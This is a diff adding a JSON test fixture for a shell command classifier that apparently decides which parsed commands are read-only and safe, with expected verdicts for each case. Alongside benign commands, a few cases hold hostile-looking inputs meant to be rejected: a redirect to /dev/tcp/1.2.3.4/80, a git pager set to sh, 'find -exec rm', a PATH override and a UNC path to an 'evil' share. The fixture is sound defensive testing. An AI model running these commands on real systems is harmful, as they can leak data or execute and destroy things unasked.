@@ -1,0 +1,561 @@
+{
+  "cases": [
+    {
+      "name": "direct_ip_addr",
+      "input": {
+        "argv": [
+          "ip",
+          "addr"
+        ],
+        "commandText": "ip addr",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "ip",
+        "redirects": []
+      }
+    },
+    {
+      "name": "direct_node_version",
+      "input": {
+        "argv": [
+          "node",
+          "-v"
+        ],
+        "commandText": "node -v",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "node",
+        "redirects": []
+      }
+    },
+    {
+      "name": "direct_python_version",
+      "input": {
+        "argv": [
+          "python3",
+          "--version"
+        ],
+        "commandText": "python3 --version",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "python3",
+        "redirects": []
+      }
+    },
+    {
+      "name": "direct_history_bare",
+      "input": {
+        "argv": [
+          "history"
+        ],
+        "commandText": "history",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "history",
+        "redirects": []
+      }
+    },
+    {
+      "name": "direct_history_number",
+      "input": {
+        "argv": [
+          "history",
+          "12"
+        ],
+        "commandText": "history 12",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "history",
+        "redirects": []
+      }
+    },
+    {
+      "name": "direct_history_junk",
+      "input": {
+        "argv": [
+          "history",
+          "all"
+        ],
+        "commandText": "history all",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "history",
+        "redirects": []
+      }
+    },
+    {
+      "name": "git_status",
+      "input": {
+        "argv": [
+          "git",
+          "status"
+        ],
+        "commandText": "git status",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "git",
+        "redirects": []
+      }
+    },
+    {
+      "name": "git_log_oneline",
+      "input": {
+        "argv": [
+          "git",
+          "log",
+          "--oneline"
+        ],
+        "commandText": "git log --oneline",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "git",
+        "redirects": []
+      }
+    },
+    {
+      "name": "git_commit_is_not_readonly",
+      "input": {
+        "argv": [
+          "git",
+          "commit",
+          "-m",
+          "x"
+        ],
+        "commandText": "git commit -m x",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "git",
+        "redirects": []
+      }
+    },
+    {
+      "name": "git_push_is_not_readonly",
+      "input": {
+        "argv": [
+          "git",
+          "push"
+        ],
+        "commandText": "git push",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "git",
+        "redirects": []
+      }
+    },
+    {
+      "name": "git_dangerous_global",
+      "input": {
+        "argv": [
+          "git",
+          "-c",
+          "core.pager=sh",
+          "log"
+        ],
+        "commandText": "git -c core.pager=sh log",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "git",
+        "redirects": []
+      }
+    },
+    {
+      "name": "gh_auth_status",
+      "input": {
+        "argv": [
+          "gh",
+          "auth",
+          "status"
+        ],
+        "commandText": "gh auth status",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "gh",
+        "redirects": []
+      }
+    },
+    {
+      "name": "gh_auth_login_is_not_readonly",
+      "input": {
+        "argv": [
+          "gh",
+          "auth",
+          "login"
+        ],
+        "commandText": "gh auth login",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "gh",
+        "redirects": []
+      }
+    },
+    {
+      "name": "gh_pr_dangerous_target",
+      "input": {
+        "argv": [
+          "gh",
+          "pr",
+          "checkout",
+          "a/b/c"
+        ],
+        "commandText": "gh pr checkout a/b/c",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "gh",
+        "redirects": []
+      }
+    },
+    {
+      "name": "allow_any_ls",
+      "input": {
+        "argv": [
+          "ls"
+        ],
+        "commandText": "ls",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "ls",
+        "redirects": []
+      }
+    },
+    {
+      "name": "allow_any_echo",
+      "input": {
+        "argv": [
+          "echo",
+          "hello"
+        ],
+        "commandText": "echo hello",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "echo",
+        "redirects": []
+      }
+    },
+    {
+      "name": "find_readonly",
+      "input": {
+        "argv": [
+          "find",
+          ".",
+          "-name",
+          "*.ts"
+        ],
+        "commandText": "find . -name *.ts",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "find",
+        "redirects": []
+      }
+    },
+    {
+      "name": "find_with_exec_is_not_readonly",
+      "input": {
+        "argv": [
+          "find",
+          ".",
+          "-exec",
+          "rm"
+        ],
+        "commandText": "find . -exec rm",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "find",
+        "redirects": []
+      }
+    },
+    {
+      "name": "cat_readonly",
+      "input": {
+        "argv": [
+          "cat",
+          "file.txt"
+        ],
+        "commandText": "cat file.txt",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "cat",
+        "redirects": []
+      }
+    },
+    {
+      "name": "cd_too_many_args",
+      "input": {
+        "argv": [
+          "cd",
+          "/tmp",
+          "extra"
+        ],
+        "commandText": "cd /tmp extra",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "cd",
+        "redirects": []
+      }
+    },
+    {
+      "name": "command_wrapper",
+      "input": {
+        "argv": [
+          "command",
+          "ls"
+        ],
+        "commandText": "command ls",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "command",
+        "redirects": []
+      }
+    },
+    {
+      "name": "env_wrapper",
+      "input": {
+        "argv": [
+          "env",
+          "ls"
+        ],
+        "commandText": "env ls",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "env",
+        "redirects": []
+      }
+    },
+    {
+      "name": "sudo_is_not_stripped",
+      "input": {
+        "argv": [
+          "sudo",
+          "ls"
+        ],
+        "commandText": "sudo ls",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "sudo",
+        "redirects": []
+      }
+    },
+    {
+      "name": "unsafe_env_assignment",
+      "input": {
+        "argv": [
+          "ls"
+        ],
+        "commandText": "ls",
+        "envAssignments": [
+          {
+            "name": "PATH",
+            "value": "/x"
+          }
+        ],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "ls",
+        "redirects": []
+      }
+    },
+    {
+      "name": "safe_env_assignment",
+      "input": {
+        "argv": [
+          "ls"
+        ],
+        "commandText": "ls",
+        "envAssignments": [
+          {
+            "name": "LANG",
+            "value": "C"
+          }
+        ],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "ls",
+        "redirects": []
+      }
+    },
+    {
+      "name": "unsafe_redirect",
+      "input": {
+        "argv": [
+          "cat"
+        ],
+        "commandText": "cat",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": true,
+        "name": "cat",
+        "redirects": [
+          {
+            "operator": ">",
+            "target": "/dev/tcp/1.2.3.4/80"
+          }
+        ]
+      }
+    },
+    {
+      "name": "dev_null_redirect_ok",
+      "input": {
+        "argv": [
+          "cat"
+        ],
+        "commandText": "cat",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": true,
+        "name": "cat",
+        "redirects": [
+          {
+            "operator": ">",
+            "target": "/dev/null"
+          }
+        ]
+      }
+    },
+    {
+      "name": "input_redirect_ok",
+      "input": {
+        "argv": [
+          "cat"
+        ],
+        "commandText": "cat",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": true,
+        "name": "cat",
+        "redirects": [
+          {
+            "operator": "<",
+            "target": "in.txt"
+          }
+        ]
+      }
+    },
+    {
+      "name": "unc_path_rejected",
+      "input": {
+        "argv": [
+          "cat",
+          "\\\\evil\\share\\f"
+        ],
+        "commandText": "cat \\\\evil\\share\\f",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "cat",
+        "redirects": []
+      }
+    },
+    {
+      "name": "empty_argv",
+      "input": {
+        "argv": [],
+        "commandText": "",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "",
+        "redirects": []
+      }
+    },
+    {
+      "name": "unknown_command",
+      "input": {
+        "argv": [
+          "zzz-not-real"
+        ],
+        "commandText": "zzz-not-real",
+        "envAssignments": [],
+        "hasAssignmentPrefix": false,
+        "hasDynamicWords": false,
+        "hasRedirects": false,
+        "name": "zzz-not-real",
+        "redirects": []
+      }
+    }
+  ],
+  "verdicts": {
+    "direct_ip_addr": true,
+    "direct_node_version": true,
+    "direct_python_version": true,
+    "direct_history_bare": true,
+    "direct_history_number": true,
+    "direct_history_junk": false,
+    "git_status": true,
+    "git_log_oneline": true,
+    "git_commit_is_not_readonly": false,
+    "git_push_is_not_readonly": false,
+    "git_dangerous_global": false,
+    "gh_auth_status": true,
+    "gh_auth_login_is_not_readonly": null,
+    "gh_pr_dangerous_target": null,
+    "allow_any_ls": true,
+    "allow_any_echo": true,
+    "find_readonly": true,
+    "find_with_exec_is_not_readonly": false,
+    "cat_readonly": true,
+    "cd_too_many_args": false,
+    "command_wrapper": true,
+    "env_wrapper": null,
+    "sudo_is_not_stripped": null,
+    "unsafe_env_assignment": false,
+    "safe_env_assignment": true,
+    "unsafe_redirect": false,
+    "dev_null_redirect_ok": true,
+    "input_redirect_ok": true,
+    "unc_path_rejected": false,
+    "empty_argv": false,
+    "unknown_command": null
+  }
+}
